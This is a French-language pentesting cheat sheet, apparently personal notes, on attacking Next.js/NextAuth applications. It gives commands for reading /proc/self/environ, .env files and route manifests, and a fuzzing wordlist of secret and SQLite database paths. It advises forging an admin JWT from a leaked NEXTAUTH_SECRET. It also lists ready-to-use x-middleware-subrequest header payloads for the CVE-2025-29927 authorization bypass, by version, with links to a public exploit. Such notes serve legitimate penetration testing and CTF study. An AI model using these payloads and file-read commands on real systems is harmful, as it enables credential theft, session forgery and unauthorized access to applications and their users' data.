
> [!TIP]
> Framework Javascript (REACT + NodeJS)


[[#Enumeration]]
[[#Exploitation]]

---
# Enumeration

[[#Repertoire home]]
[[#Routes]] (Golden)
[[#Env]] (Golden)
[[#Wordlist]]

## Repertoire home

identifier le répertoire home de l'application

```
cat /proc/self/environ
```

## Routes

> [!tip]
> Essayer d'identifier les routes liées  à l'authent qui peuvent contenir des credentials

Mapping de toute les routes

```
cat /app/.next/routes-manifest.json
```

```
cat /app/.next/server/middleware-manifest.json
```


## Env

https://next-auth.js.org/configuration/options

> [!TIP]
> Checker les variables d'environnement.
> Contient la variable NEXTAUTH_SECRET permettant de signer et forger un JWT si présence de la variable SESSION.STRATEGY = "jwt".
> Peut également contenir SESSION.STRATEGY = "database" et la variable DATABASE_URL contenant les identifiants de la db. (Si sqlite, récupérer le fichier de base de données.)

```
cat /app/.env
```


## Wordlist

Wordlist pour fuzzing.

```
/proc/self/environ
/.env
/.env.local
/.env.development
/.env.production
/.env.test
/app/.env
/app/.env.local
/app/.env.development
/app/.env.production
/app/.env.test
/.next/server/routes-manifest.json
/.next/server/middleware-manifest.json
/.next/build-manifest.json
/.next/prerender-manifest.json
/.next/BUILD_ID
/.next/server/app/
/.next/server/app/api/
/.next/server/pages/api/
/.next/server/pages/api/auth/[...nextauth].js
/.next/server/pages/api/auth/signin.js
/.next/server/pages/api/auth/signup.js
/.next/server/pages/api/auth/callback.js
/.next/server/pages/api/auth/session.js
/.next/server/pages/api/docs.js
/.next/server/pages/api/users.js
/.next/server/pages/api/admin.js
/.next/server/pages/api/secret.js
/.next/server/pages/api/internal.js
/.next/server/app/api/auth/[...nextauth]/route.js
/.next/server/app/api/auth/signin/route.js
/.next/server/app/api/auth/signup/route.js
/.next/server/app/api/auth/callback/route.js
/.next/server/app/api/auth/session/route.js
/.next/server/app/api/docs/route.js
/.next/server/app/api/users/route.js
/.next/server/app/api/admin/route.js
/.next/server/app/api/secret/route.js
/.next/server/app/api/internal/route.js
/app/.next/server/routes-manifest.json
/app/.next/server/middleware-manifest.json
/app/.next/build-manifest.json
/app/.next/prerender-manifest.json
/app/.next/BUILD_ID
/app/.next/server/app/
/app/.next/server/app/api/
/app/.next/server/pages/api/
/app/.next/server/pages/api/auth/[...nextauth].js
/app/.next/server/pages/api/auth/signin.js
/app/.next/server/pages/api/auth/signup.js
/app/.next/server/pages/api/auth/callback.js
/app/.next/server/pages/api/auth/session.js
/app/.next/server/pages/api/docs.js
/app/.next/server/pages/api/users.js
/app/.next/server/pages/api/admin.js
/app/.next/server/pages/api/secret.js
/app/.next/server/pages/api/internal.js
/app/.next/server/app/api/auth/[...nextauth]/route.js
/app/.next/server/app/api/auth/signin/route.js
/app/.next/server/app/api/auth/signup/route.js
/app/.next/server/app/api/auth/callback/route.js
/app/.next/server/app/api/auth/session/route.js
/app/.next/server/app/api/docs/route.js
/app/.next/server/app/api/users/route.js
/app/.next/server/app/api/admin/route.js
/app/.next/server/app/api/secret/route.js
/app/.next/server/app/api/internal/route.js
/prisma/schema.prisma
/prisma/dev.db
/prisma/test.db
/prisma/prod.db
/prisma/database.db
/prisma/db.sqlite
/prisma/db.sqlite3
/prisma/sqlite.db
/prisma/sqlite3.db
/prisma/main.db
/app/prisma/schema.prisma
/app/prisma/dev.db
/app/prisma/.env
/app/prisma/test.db
/app/prisma/prod.db
/app/prisma/database.db
/app/prisma/db.sqlite
/app/prisma/db.sqlite3
/app/prisma/sqlite.db
/app/prisma/sqlite3.db
/app/prisma/main.db
/database.db
/dev.db
/test.db
/prod.db
/db.sqlite
/db.sqlite3
/sqlite.db
/sqlite3.db
/main.db
/app/database.db
/app/dev.db
/app/test.db
/app/prod.db
/app/db.sqlite
/app/db.sqlite3
/app/sqlite.db
/app/sqlite3.db
/app/main.db
/.db.sqlite
/.db.sqlite3
/.sqlite.db
/.sqlite3.db
/.dev.db
/.test.db
/.prod.db
/app/.db.sqlite
/app/.db.sqlite3
/app/.sqlite.db
/app/.sqlite3.db
/app/.dev.db
/app/.test.db
/app/.prod.db
```

---
# Exploitation

[[#Forge JWT]]
[[#CVE-2025-29927 - Authorization Bypass]]

## Forge JWT

https://www.jwt.io/

Si utilisation de jwt, decoder le JWT à l'aide du secret, puis forger un JWT admin.


## CVE-2025-29927 - Authorization Bypass

https://www.offsec.com/blog/cve-2025-29927/

- **Affected Versions:** < 12.3.5, < 13.5.9, < 14.2.25, < 15.2.3

> [!TIP]
> Vulnérabilité dans le middleware de nextjs qui gère l'authent permettant de bypass le mécanisme d'autorisation en faisant des requêtes contenant le header "x-middleware-subrequest"

### Version < 12.2

```
x-middleware-subrequest: pages/_middleware
```

```
x-middleware-subrequest: pages/dashboard/_middleware
```

```
x-middleware-subrequest: pages/dashboard/panel/_middleware
```

### Version > 12.2 < 13

```
X-Middleware-Subrequest: middleware
```

using src :

```
X-Middleware-Subrequest: src/middleware
```

### Version > 13

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

using src :

```
x-middleware-subrequest: src/middleware:src/middleware:src/middleware:src/middleware:src/middleware
```


Public Exploit

https://raw.githubusercontent.com/UNICORDev/exploit-CVE-2025-29927/refs/heads/main/exploit-CVE-2025-29927.py

Nuclei template

https://projectdiscovery.io/blog/nextjs-middleware-authorization-bypass